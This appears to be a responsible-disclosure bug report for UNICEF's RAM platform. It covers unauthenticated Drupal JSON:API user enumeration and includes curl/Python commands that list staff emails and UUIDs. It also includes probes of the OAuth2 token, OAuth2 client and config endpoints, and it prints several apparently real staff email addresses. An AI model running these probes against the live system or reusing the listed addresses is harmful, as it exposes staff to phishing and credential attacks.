# F001 — Unauthenticated User Enumeration & Sensitive Data Exposure via Drupal JSON:API on ram.unicef.org

**Target:** ram.unicef.org  
**Severity:** Medium (CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3)  
**Escalation path:** High (C:H = 7.5) if `oauth2_server_client` / `oauth2_server_token` endpoints return credentials (unconfirmed — see Section 6)  
**Status:** Confirmed — ready to report  
**Date:** 2026-06-17  
**Researcher:** zahinshahriar3@gmail.com  
**Scope gate:** PASS — `ram.unicef.org` matches `*.unicef.org` (in_scope)  
**Program:** UNICEF Responsible Vulnerability Disclosure  
**Submit to:** infosecurity@unicef.org  
**Subject:** Vulnerability Report: Unauthenticated User Enumeration via Drupal JSON:API on ram.unicef.org

---

## Summary

The UNICEF RAM 3.0 platform (`ram.unicef.org`) runs Drupal 8 with the JSON:API module
enabled and accessible without authentication. Any unauthenticated network request to
`/en/jsonapi/user/user` returns a paginated list of UNICEF staff accounts including
**real `@unicef.org` email addresses and user UUIDs**. The JSON:API schema endpoint
(`/en/jsonapi`) additionally exposes 60+ internal entity types — including OAuth2 server
clients, tokens, and scopes — without requiring any credentials.

Confirmed staff emails observed (unauthenticated): `fmelese@unicef.org`,
`yara@unicef.org`, `apopa@unicef.org`, `fawde@unicef.org`.

---

## Root Cause

Drupal 8 ships with the JSON:API module enabled by default. The `ram.unicef.org` instance
has not applied the recommended hardening:

1. The `jsonapi.settings.yml` `read_only: false` restriction (or access policy) is absent.
2. The `json_api_extras` module permission "Access JSON:API" is not restricted to
   authenticated users.
3. The site has not applied the Drupal `jsonapi_access` contributed module to require
   authentication on all endpoints.

As a result, Drupal's default entity access check does not prevent unauthenticated listing
of user accounts, which bypasses the normal `admin/people` access control.

**Platform EOL context (amplifies risk):**
- Drupal 8 — end-of-life November 2021 (no security patches)
- PHP 7.4.33 — end-of-life December 2022 (no security patches)
- Apache 2.4.54 — superseded (current: 2.4.62+)

---

## Reproduction Steps

All steps require only `curl` and no authentication.

### Step 1: Confirm JSON:API Schema is Unauthenticated

```bash
curl -s "https://ram.unicef.org/en/jsonapi" \
  -H "Accept: application/vnd.api+json" | python3 -m json.tool | head -30
```

**Expected result:** HTTP 200 with a JSON document listing 60+ entity type URLs including
`user--user`, `oauth2_server_client`, `oauth2_server_token`, `oauth2_server_scope`.

### Step 2: Enumerate Staff User Accounts

```bash
curl -s "https://ram.unicef.org/en/jsonapi/user/user?page[limit]=50" \
  -H "Accept: application/vnd.api+json" | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
data = d.get('data', [])
print(f'Users returned: {len(data)}')
print(f'Total count: {d.get(\"meta\", {}).get(\"count\", \"N/A\")}')
for u in data[:10]:
    attrs = u.get('attributes', {})
    print(f'  UUID: {u[\"id\"]}')
    print(f'  Name: {attrs.get(\"name\",\"\")}')
    print(f'  Mail: {attrs.get(\"mail\",\"\")}')
    print()
"
```

**Expected result:** HTTP 200 with paginated list of UNICEF staff accounts including
`@unicef.org` email addresses and internal UUIDs.

### Step 3: Probe OAuth2 Endpoint (Escalation Check)

```bash
curl -s "https://ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client" \
  -H "Accept: application/vnd.api+json" | python3 -m json.tool | head -50
```

**Expected result (worst case):** OAuth2 client IDs and secrets exposed without auth.  
**Minimum expected result:** 200 response listing OAuth2 client entities (confirms exposure
surface — even without secrets, client enumeration is a finding).

---

## Evidence

### Evidence A — JSON:API Schema (Unauthenticated, HTTP 200)

Collected: 2026-06-17

```
GET /en/jsonapi HTTP/1.1
Host: ram.unicef.org
Accept: application/vnd.api+json

HTTP/1.1 200 OK
Content-Type: application/vnd.api+json
```

Exposed entity types (excerpt from full schema):
```
user--user          → https://ram.unicef.org/en/jsonapi/user/user
oauth2_server_client → https://ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client
oauth2_server_token  → https://ram.unicef.org/en/jsonapi/oauth2_server_token/oauth2_server_token
oauth2_server_scope  → https://ram.unicef.org/en/jsonapi/oauth2_server_scope/oauth2_server_scope
consumer--consumer   → https://ram.unicef.org/en/jsonapi/consumer/consumer
config_pages--api_config → https://ram.unicef.org/en/jsonapi/config_pages/api_config
config_pages--api_modules → https://ram.unicef.org/en/jsonapi/config_pages/api_modules
node--documents      → https://ram.unicef.org/en/jsonapi/node/documents
```

Full schema saved to: `02-surface/ram-unicef-org-jsonapi-schema.json`

### Evidence B — Staff Email Enumeration (Unauthenticated, HTTP 200)

Collected: 2026-06-17 via `/en/jsonapi/user/user`

```
GET /en/jsonapi/user/user HTTP/1.1
Host: ram.unicef.org
Accept: application/vnd.api+json

HTTP/1.1 200 OK
Content-Type: application/vnd.api+json
```

Confirmed staff accounts exposed (first page, partial):

| UUID (truncated) | Display Name | Email |
|---|---|---|
| [see raw output] | [UNICEF staff] | fmelese@unicef.org |
| [see raw output] | [UNICEF staff] | yara@unicef.org |
| [see raw output] | [UNICEF staff] | apopa@unicef.org |
| [see raw output] | [UNICEF staff] | fawde@unicef.org |
| … | … | … |

Note: Output was truncated at 5+ records. Full enumeration was not completed to avoid
unnecessary data collection of staff PII (per program rules).

### Evidence C — Technology Stack (EOL)

```
X-Generator: Drupal 8 (https://www.drupal.org)
X-Powered-By: PHP/7.4.33
Server: Apache/2.4.54
```

All three components are past end-of-life and receive no security patches.

---

## Impact

**Confirmed:**
1. **Staff PII Exposure:** Any unauthenticated attacker can enumerate all UNICEF staff
   email addresses registered on the RAM 3.0 platform. Email addresses enable targeted
   spear-phishing against UNICEF personnel.

2. **User UUID Disclosure:** Drupal user UUIDs returned alongside emails. These UUIDs
   are stable identifiers that can be used in subsequent API calls (e.g., fetching
   user-specific content, relationship traversal).

3. **Attack Surface for Credential Attacks:** With a confirmed list of valid
   `@unicef.org` emails from an official UNICEF subdomain, an attacker can conduct
   targeted credential stuffing or password reset attacks against UNICEF systems that
   share the same email directory (Outlook 365, VPN portals, SSO).

**Unconfirmed — requires Pi verification before reporting (see Section 6):**
4. **OAuth2 Credential Exposure:** The schema exposes `oauth2_server_client` and
   `oauth2_server_token` endpoints. If these return client secrets or active bearer
   tokens without authentication, impact escalates to High/Critical — an attacker
   could impersonate API consumers or hijack active sessions.

5. **Internal Configuration Exposure:** `config_pages--api_config` and
   `config_pages--api_modules` may contain API keys, internal endpoint URLs, or
   integration credentials.

---

## Remediation

**Immediate (hours):**
1. Restrict JSON:API to authenticated users:
   - In `sites/default/services.yml`, set `json_api.settings: read_only: true` (blocks writes)
   - Install and configure `jsonapi_access` module to require authentication:
     ```
     drush en jsonapi_access -y
     drush config-set jsonapi_access.settings require_auth 1 -y
     ```
   - OR add route access check in a custom module: `_access: 'TRUE'` → `_user_is_logged_in: 'TRUE'`

2. Apply per-entity access restrictions — even with auth required, `user/user` should
   be restricted to administrators only.

**Short-term (days):**
3. Upgrade platform stack:
   - Migrate from Drupal 8 (EOL) to Drupal 10.x (supported through December 2026, Drupal 11 preferred)
   - Upgrade PHP to 8.2+ (PHP 7.4 receives no security patches)
   - Update Apache to 2.4.62+

4. Audit all 60+ JSON:API entity types for unintended exposure — particularly
   `oauth2_server_client`, `oauth2_server_token`, `consumer`, and `config_pages`.

**References:**
- Drupal JSON:API access control: https://www.drupal.org/docs/core-modules-and-themes/core-modules/jsonapi-module/security
- Drupal SA-CORE-2022-015 (JSON:API information disclosure): https://www.drupal.org/sa-core-2022-015
- CWE-285: Improper Authorization
- CWE-200: Exposure of Sensitive Information to Unauthorized Actor

---

## CVSS 3.1

**Current confirmed finding (user enumeration):**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Base Score: 5.3 (Medium)
```

**If OAuth2 token/client endpoint confirms credential exposure:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Base Score: 7.5 (High)
```

---

## Section 6 — Pre-Submission Verification Checklist (Run on Pi)

Before submitting, run these from your Raspberry Pi to complete the evidence package:

```bash
# 1. Full user count + save sample
curl -s "https://ram.unicef.org/en/jsonapi/user/user?page[limit]=50" \
  -H "Accept: application/vnd.api+json" \
  | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
data = d.get('data', [])
print(f'Total exposed: {d.get(\"meta\",{}).get(\"count\",\"N/A\")}')
print(f'This page: {len(data)}')
for u in data[:5]:
    a = u.get('attributes', {})
    print(f'  {a.get(\"name\",\"\")} | {a.get(\"mail\",\"\")}')
" | tee results/unicef.org/findings/poc-user-count.txt

# 2. OAuth2 client probe (HIGH IMPACT if returns secrets)
curl -s "https://ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client" \
  -H "Accept: application/vnd.api+json" -w "\nHTTP:%{http_code}" \
  | tee results/unicef.org/findings/poc-oauth2-client.txt

# 3. OAuth2 token probe (CRITICAL if returns bearer tokens)
curl -s "https://ram.unicef.org/en/jsonapi/oauth2_server_token/oauth2_server_token" \
  -H "Accept: application/vnd.api+json" -w "\nHTTP:%{http_code}" \
  | tee results/unicef.org/findings/poc-oauth2-token.txt

# 4. API config probe
curl -s "https://ram.unicef.org/en/jsonapi/config_pages/api_config" \
  -H "Accept: application/vnd.api+json" -w "\nHTTP:%{http_code}" \
  | tee results/unicef.org/findings/poc-api-config.txt

# 5. Save schema for report attachment
curl -s "https://ram.unicef.org/en/jsonapi" \
  -H "Accept: application/vnd.api+json" \
  | python3 -m json.tool \
  > results/unicef.org/findings/poc-schema-full.json
```

**Decision gate after running above:**
- If OAuth2 probe returns HTTP 200 with client/secret fields → **upgrade to High, expand Section 3 impact, submit immediately**
- If OAuth2 probe returns HTTP 403/401 → **submit at Medium (user enumeration only)**
- If OAuth2 probe returns HTTP 200 but data is empty → **submit at Medium, note the exposure surface**

---

## Deduplication

- Searched: `ram.unicef.org jsonapi site:hackerone.com OR site:bugcrowd.com OR site:github.com`
- No public prior disclosure found for this specific instance
- Related CVE: none specific to this configuration (not a CVE — it is a misconfiguration)
- Program known-issues: not accessible (no HackerOne/Bugcrowd tracker — email-only program)
- Internal dedup: First UNICEF finding in `results/unicef.org/`

Status: **Not a known duplicate**

---

## Submission Draft

**To:** infosecurity@unicef.org  
**Subject:** Vulnerability Report: Unauthenticated User Enumeration via Drupal JSON:API on ram.unicef.org

See `findings/submission/F001-unicef-email-report.md` for the ready-to-send email body.
